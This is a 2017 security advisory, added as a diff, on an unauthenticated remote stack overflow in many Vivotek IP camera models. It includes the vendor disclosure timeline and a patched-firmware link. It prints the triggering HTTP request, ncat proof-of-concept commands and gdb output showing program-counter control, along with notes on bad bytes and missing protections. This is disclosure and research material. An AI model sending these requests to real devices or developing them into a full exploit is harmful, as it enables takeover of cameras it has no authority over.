@@ -1,0 +1,143 @@
+[STX]
+
+Subject: Vivotek IP Cameras - Remote Stack Overflow
+Researcher: bashis <mcw noemail eu> (September-October 2017)
+PoC: https://github.com/mcw0/PoC
+Release date: November 13, 2017
+Full Disclosure: 43 days
+
+Attack Vector: Remote
+Authentication: Anonymous (no credentials needed)
+Firmware Vulnerable: Only 2017 versions affected
+Firmware Patched: October 2017 and higher
+
+Device Model:
+CC8160, CC8370, CC8371, CD8371, FD8166A, FD8166A, FD8166A-N, FD8167A, FD8167A, FD8167AS,
+FD8167AS, FD8169A, FD8169A, FD8169A, FD8169AS, FD8169AS, FD816B, FD816B, FD816BA, FD816BA,
+FD816C, FD816C, FD816CA, FD816CA, FD816D, FD8177, FD8179, FD8182, FD8182, FD8182-F1,
+FD8365A_v2, FD8367A, FD8367A, FD8369A, FD8369A, FD836B, FD836BA, FD836D, FD8377, FD8379,
+FD8382, FD9171, FD9181, FD9371, FD9381, FE8174_v2, FE8181_v2, FE8182, FE8374_v2, FE8381_v2,
+FE9181, FE9182, FE9381, FE9382, IB8367A, IB8369A, IB836B, IB836BA, IB836D, IB8377,
+IB8379, IB8382, IB9371, IB9381, IP8166, IP9171, IP9181, IZ9361, MD8563, MD8564,
+MD8565, SD9161, SD9361, SD9362, SD9363, SD9364, SD9365, SD9366, VC8101... and possible more
+
+Download Updated Firmware: http://www.vivotek.com/firmware/
+
+
+[Timeline]
+
+October 1, 2017: Reported findings with all details to Vivotek Cybersecurity
+October 2, 2017: First response from Vivotek
+October 5, 2017: ACK of findings from Vivotek
+October 11, 2017: Vivotek reported first fixed Firmware
+October 12, 2017: After request, Vivotek provided samples of fixed Firmware
+October 17, 2017: Verified fixed Firmware, Vivotek thanking for the help
+October 30, 2017: Noticed new Firmware released, pinged to get some info about their advisory
+November 1, 2017: Agreed on publication November 13, 2017
+November 9, 2017: Checked few release notes, none mention security fix; pinged Vivotek with the question why not.
+November 13, 2017: No reply from Vivotek, Full Disclosure as planned.
+
+
+[Details]
+
+Vivotek using modified version of Boa/0.94.14rc21, and the vulnerability has been introduced by Vivotek.
+
+The stack overflow is triggered by "PUT" or "POST" request:
+
+[PUT|POST] /cgi-bin/admin/upgrade.cgi HTTP/1.0\nContent-Length:[20 bytes garbage]BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n
+
+However,
+the absolutely minimal request to trigger the stack overflow is weird, most probably due to quick hack:
+"[PUT|POST]Content-Length:[20 bytes garbage]BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"
+
+This allows us to insert [JUNK] with 'Good bytes' up to 9182 bytes (0x1FFF) of the request:
+"[PUT|POST][JUNK]Content-Length[JUNK]:[20 bytes garbage]BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"
+
+
+Notes:
+1. B to I = $R4-$R11; X = $PC
+2. Size of request availible in $R3 at the LDMFD
+3. Max request size: 9182 bytes (0x1FFF)
+4. "Start with "\n" in "\n\r\n\r\n" needed to jump with 0x00xxxxxx (if not $PC will be 0x0dxxxxxx)
+5. Space (0x20) after ':' in 'Content-Length:' counting as one char of the 20 bytes
+6. Stack not protected with "Stack canaries"
+7. Good bytes: 0x01-0x09, 0x0b-0xff; Bad bytes: 0x00, 0x0a;
+8. heap: Non-executable + Non-ASLR
+9. stack: Non-executable + ASLR
+
+
+[PoC]
+
+$ echo -en "POST /cgi-bin/admin/upgrade.cgi HTTP/1.0\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"  | ncat -v 192.168.57.20 80
+
+(gdb) target remote 192.168.57.20:23946
+Remote debugging using 192.168.57.20:23946
+0x76eb2c5c in ?? ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x58585858 in ?? ()
+(gdb) bt
+#0  0x58585858 in ?? ()
+#1  0x000188f4 in ?? ()
+Backtrace stopped: previous frame identical to this frame (corrupt stack?)
+(gdb) i reg
+r0             0x1	1
+r1             0x47210	291344
+r2             0x0	0
+r3             0x75	117
+r4             0x42424242	1111638594
+r5             0x43434343	1128481603
+r6             0x44444444	1145324612
+r7             0x45454545	1162167621
+r8             0x46464646	1179010630
+r9             0x47474747	1195853639
+r10            0x48484848	1212696648
+r11            0x49494949	1229539657
+r12            0x1	1
+sp             0x7e92dac0	0x7e92dac0
+lr             0x188f4	100596
+pc             0x58585858	0x58585858
+cpsr           0x60000010	1610612752
+(gdb)
+
+
+$ echo -en "PUTContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n" | ncat -v 192.168.57.20 80
+
+(gdb) target remote 192.168.57.20:23946
+Remote debugging using 192.168.57.20:23946
+0x76e82c5c in ?? ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x58585858 in ?? ()
+(gdb) bt
+#0  0x58585858 in ?? ()
+#1  0x000188f4 in ?? ()
+Backtrace stopped: previous frame identical to this frame (corrupt stack?)
+(gdb) i reg
+r0             0x1	1
+r1             0x47210	291344
+r2             0x0	0
+r3             0x4f	79
+r4             0x42424242	1111638594
+r5             0x43434343	1128481603
+r6             0x44444444	1145324612
+r7             0x45454545	1162167621
+r8             0x46464646	1179010630
+r9             0x47474747	1195853639
+r10            0x48484848	1212696648
+r11            0x49494949	1229539657
+r12            0x1	1
+sp             0x7ec9cac0	0x7ec9cac0
+lr             0x188f4	100596
+pc             0x58585858	0x58585858
+cpsr           0x60000010	1610612752
+(gdb)
+
+Have a nice day
+/bashis
+
+[ETX]
